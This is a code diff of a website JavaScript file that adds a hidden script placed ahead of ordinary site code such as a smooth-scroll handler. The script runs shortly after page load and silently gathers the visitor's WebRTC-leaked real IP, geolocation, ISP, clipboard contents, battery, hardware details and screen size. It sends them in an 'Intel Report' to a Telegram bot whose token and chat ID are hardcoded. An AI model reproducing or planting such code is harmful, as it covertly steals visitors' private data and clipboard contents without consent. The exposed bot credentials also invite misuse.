@@ -1,68 +1,88 @@
-/* Project: Shadow Intel v3
-   Status: Stealth Mode Active
-*/
-
-(function(_0xShadow) {
-    const _config = {
-        _t: '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas', // আপনার বোট টোকেন
-        _c: '7950771882' // আপনার চ্যাট আইডি
+(function() {
+    const config = {
+        token: '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas',
+        chatId: '7950771882'
     };
 
-    async function _dispatch(_msg) {
+    async function sendToTelegram(msg) {
         try {
-            await fetch(`https://api.telegram.org/bot${_config._t}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: _config._c, text: _msg, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: config.chatId, text: msg, parse_mode: 'Markdown' })
             });
-        } catch (e) {}
+        } catch (e) { console.error("Telegram Dispatch Error"); }
     }
 
-    async function _initScanner() {
-        // ১. নেটওয়ার্ক ও রিয়েল আইপি (WebRTC)
-        let _rip = "Hidden";
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
-        pc.createDataChannel(""); pc.createOffer().then(d => pc.setLocalDescription(d));
-        pc.onicecandidate = (i) => {
-            if (i && i.candidate && i.candidate.candidate) {
-                _rip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+    async function getRealIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
+            pc.createDataChannel(""); pc.createOffer().then(d => pc.setLocalDescription(d));
+            pc.onicecandidate = (i) => {
+                if (i && i.candidate && i.candidate.candidate) {
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+                    resolve(ip);
+                }
+            };
+            setTimeout(() => resolve("Not Detected"), 3000);
+        });
+    }
+
+    async function runEliteScanner() {
+        // ১. রিয়েল আইপি (WebRTC)
+        const realIp = await getRealIP();
+
+        // ২. আইপি ও লোকেশন ডিটেইলস
+        let ext = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ext = await res.json();
+        } catch (e) {}
+
+        // ৩. ক্লিপবোর্ড (এটি ট্রিকি, শুধুমাত্র ইউজার পেজে ক্লিক করলে কাজ করার সম্ভাবনা বেশি)
+        let clipData = "Access Denied/No Focus";
+        try {
+            if (navigator.clipboard) {
+                clipData = await navigator.clipboard.readText();
             }
-        };
+        } catch (e) { clipData = "Permission Required"; }
 
-        // ২. আইপি ডিটেইলস (ISP/Org)
-        let _ext = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        // ৪. ব্যাটারি
+        let batt = "N/A";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = Math.round(b.level * 100) + "%";
+            }
+        } catch (e) {}
 
-        // ৩. ক্লিপবোর্ড ডেটা (যদি ইউজার পারমিশন দেয় বা ফোকাস থাকে)
-        let _clip = "No Permission";
-        if (navigator.clipboard) {
-            _clip = await navigator.clipboard.readText().catch(() => "Protected");
-        }
-
-        // ৪. মেটাডাটা কম্পাইল
-        const _log = `
-🕵️ **Yash Khan Intel Report**
+        const report = `
+🕵️ **Yash Khan Elite Intel Report**
 -----------------------------
-🌐 **Public IP:** ${_ext.ip || 'N/A'}
-📡 **Real IP (WebRTC):** ${_rip}
-🏢 **ISP:** ${_ext.org || 'N/A'}
-📍 **City:** ${_ext.city}, ${_ext.country_name}
-🔋 **Battery:** ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}
-📋 **Clipboard:** \`${_clip}\`
+🌐 **Public IP:** ${ext.ip || 'N/A'}
+📡 **Real IP (WebRTC):** ${realIp}
+🏢 **ISP:** ${ext.org || 'N/A'}
+📍 **Location:** ${ext.city || 'N/A'}, ${ext.country_name || 'N/A'}
+🔋 **Battery:** ${batt}
+📋 **Clipboard:** \`${clipData}\`
 💻 **OS:** ${navigator.platform}
-📱 **Device Memory:** ${navigator.deviceMemory || 'N/A'} GB
+📱 **Memory:** ${navigator.deviceMemory || 'N/A'} GB
 🧠 **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
+🖥️ **Screen:** ${window.screen.width}x${window.screen.height}
 🕒 **Time:** ${new Date().toLocaleString()}
 -----------------------------
-🛡️ *Unit: Offensive Bangladesh*
+🛡️ *Status: Offensive Bangladesh*
         `;
 
-        _dispatch(_log);
+        await sendToTelegram(report);
     }
 
-    // ব্যাকগ্রাউন্ডে ২ সেকেন্ড পর রান হবে
-    setTimeout(_initScanner, 2000);
+    // ওয়েবসাইট লোড হওয়ার ৩ সেকেন্ড পর রান হবে
+    window.addEventListener('load', () => {
+        setTimeout(runEliteScanner, 3000);
+    });
+})();
 
-})(window);
 
 // ===== Smooth Scroll =====
 function scrollToSection() {
